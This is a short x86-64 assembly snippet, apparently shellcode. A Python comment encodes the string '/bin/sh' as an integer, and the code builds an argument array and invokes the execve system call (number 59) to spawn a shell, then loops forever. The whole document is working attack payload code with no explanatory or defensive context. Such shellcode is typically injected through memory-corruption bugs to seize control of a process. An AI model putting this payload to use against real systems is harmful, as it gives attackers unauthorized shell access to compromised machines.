
# >>> import struct
# >>> struct.unpack('<Q', '/bin/sh\x00')
# (29400045130965551,)

# push 6845231
# push 1852400175
mov $29400045130965551, %rdx
sub $0x10, %rax
mov %rdx, (%rax)
mov %rax, %rdi

xor %rdx, %rdx
sub $0x8, %rax
mov %rdx, (%rax)

sub $0x8, %rax
mov %rdi, (%rax)
mov %rax, %rsi
xor %rax, %rax
mov $59, %al
syscall
inf:
jmp inf
